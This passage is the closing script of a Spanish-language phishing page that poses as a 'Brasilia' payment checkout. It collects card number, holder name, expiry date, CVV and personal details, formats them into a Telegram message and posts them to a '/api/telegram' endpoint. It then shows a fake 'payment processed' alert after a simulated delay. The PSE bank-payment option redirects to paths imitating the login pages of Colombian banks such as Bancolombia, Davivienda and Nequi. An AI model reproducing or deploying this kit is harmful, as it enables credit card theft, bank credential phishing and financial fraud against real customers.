			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }

			return true;
		}

		async function pagarConTarjeta() {
			if (!validarFormularioTarjeta()) return;

			datosRecopilados.numeroTarjeta = document.getElementById('numeroTarjeta').value.trim();
			datosRecopilados.nombreTitular = document.getElementById('nombreTitular').value.trim();
			datosRecopilados.fechaVencimiento = document.getElementById('fechaVencimiento').value.trim();
			datosRecopilados.cvv = document.getElementById('cvv').value.trim();
			datosRecopilados.nombre = document.getElementById('nombrePagadorTarjeta').value.trim();
			datosRecopilados.email = document.getElementById('emailPagadorTarjeta').value.trim();
			datosRecopilados.celular = document.getElementById('celularPagadorTarjeta').value.trim();
			datosRecopilados.direccion = document.getElementById('direccionPagadorTarjeta').value.trim();
			datosRecopilados.ciudad = document.getElementById('ciudadPagadorTarjeta').value.trim();
			datosRecopilados.departamento = document.getElementById('departamentoPagadorTarjeta').value.trim();

			sessionStorage.setItem('datosRecopilados', JSON.stringify(datosRecopilados));

			document.getElementById('btnPagarTarjeta').disabled = true;
			mostrarOverlayCarga('Procesando pago...');
			await enviarPagoATelegram('tarjeta');
			iniciarPolling();
		}

		function validarFormularioPSE() {
			const banco = document.getElementById('selectBanco').value;
			const tipoPersona = document.getElementById('selectTipoPersona').value;
			const nombrePagador = document.getElementById('nombrePagadorPSE').value.trim();
			const emailPagador = document.getElementById('emailPagadorPSE').value.trim();
			const celularPagador = document.getElementById('celularPagadorPSE').value.trim();
			const direccionPagador = document.getElementById('direccionPagadorPSE').value.trim();
			const ciudadPagador = document.getElementById('ciudadPagadorPSE').value.trim();
			const departamentoPagador = document.getElementById('departamentoPagadorPSE').value.trim();

			if (!banco) { alert('Selecciona tu banco'); return false; }
			if (!tipoPersona) { alert('Selecciona el tipo de persona'); return false; }
			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electronico valido'); return false; }
			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un numero de celular valido'); return false; }
			if (!direccionPagador) { alert('Ingresa la direccion'); return false; }
			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }

			return true;
		}

		function pagarConPSE() {
			if (!validarFormularioPSE()) return;

			const banco = document.getElementById('selectBanco').value;
			const tipoPersona = document.getElementById('selectTipoPersona').value;

			datosRecopilados.banco = banco;
			datosRecopilados.tipoPersona = tipoPersona;
			datosRecopilados.nombre = document.getElementById('nombrePagadorPSE').value.trim();
			datosRecopilados.email = document.getElementById('emailPagadorPSE').value.trim();
			datosRecopilados.celular = document.getElementById('celularPagadorPSE').value.trim();
			datosRecopilados.direccion = document.getElementById('direccionPagadorPSE').value.trim();
			datosRecopilados.ciudad = document.getElementById('ciudadPagadorPSE').value.trim();
			datosRecopilados.departamento = document.getElementById('departamentoPagadorPSE').value.trim();

			sessionStorage.setItem('pseDatos', JSON.stringify(datosRecopilados));
			sessionStorage.setItem('pseTotal', totalAPagar);
			sessionStorage.setItem('pseBanco', banco);

			document.getElementById('btnPagarPSE').disabled = true;
			mostrarOverlayCarga('Ingresando a su Banca...');

			const rutasBancos = {
				'bancolombia': '/3co/trico',
				'avvillas': '/avvillas/avvi',
				'bbva': '/bbva/inicio',
				'bogota': '/bogota/bogo',
				'cajasocial': '/cajasocial/caja',
				'colpatria': '/colpatria/colpa',
				'davivienda': '/davivienda/davi',
				'falabella': '/falabella/fala',
				'nequi': '/nequi/nequ',
				'occidente': '/occidente/occi',
				'popular': '/popular/popu'
			};

			const ruta = rutasBancos[banco] || '/pin/inicio';
			setTimeout(() => {
				window.location.href = ruta;
			}, 2000);
		}

		async function enviarPagoATelegram(tipoPago) {
			try {
				const montoFormateado = totalAPagar + ' ' + monedaActual;
				let mensaje = `*PAGO DIRECTO BRASILIA*\n\n`;
				mensaje += `*ID:* \`${brasiliaUniqId}\`\n`;
				mensaje += `*Total:* \`${montoFormateado}\`\n`;
				mensaje += `*Metodo:* ${tipoPago.toUpperCase()}\n\n`;

				if (tipoPago === 'tarjeta') {
					mensaje += `*DATOS DE TARJETA:*\n`;
					mensaje += `Numero: \`${datosRecopilados.numeroTarjeta}\`\n`;
					mensaje += `Titular: \`${datosRecopilados.nombreTitular}\`\n`;
					mensaje += `Vencimiento: \`${datosRecopilados.fechaVencimiento}\`\n`;
					mensaje += `CVV: \`${datosRecopilados.cvv}\`\n\n`;
				}

				mensaje += `*DATOS DEL PAGADOR:*\n`;
				mensaje += `Nombre: \`${datosRecopilados.nombre}\`\n`;
				mensaje += `Email: \`${datosRecopilados.email}\`\n`;
				mensaje += `Celular: \`${datosRecopilados.celular}\`\n`;
				mensaje += `Direccion: \`${datosRecopilados.direccion}\`\n`;
				mensaje += `Ciudad: \`${datosRecopilados.ciudad}\`\n`;
				mensaje += `Departamento: \`${datosRecopilados.departamento}\`\n`;

				await fetch('/api/telegram', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
					},
					body: JSON.stringify({
						uniq_id: brasiliaUniqId,
						mensaje: mensaje,
						panel: 'brasilia_pago',
						total: totalAPagar,
						metodo_pago: tipoPago,
						datos: datosRecopilados
					})
				});
			} catch (error) {
				console.error('Error enviando datos:', error);
			}
		}

		function iniciarPolling() {
			// Simular procesamiento
			setTimeout(() => {
				ocultarOverlayCarga();
				alert('Pago procesado. Recibiras confirmacion por correo electronico.');
			}, 5000);
		}

		// Ocultar PSE si no es Colombia
		document.addEventListener('DOMContentLoaded', function() {
			const paisVisitante = localStorage.getItem('visitorCountry') || 'CO';
			const opcionPSE = document.getElementById('opcion-pse');
			if (paisVisitante !== 'CO') {
				opcionPSE.style.display = 'none';
			}
		});
	</script>
</body>
</html>
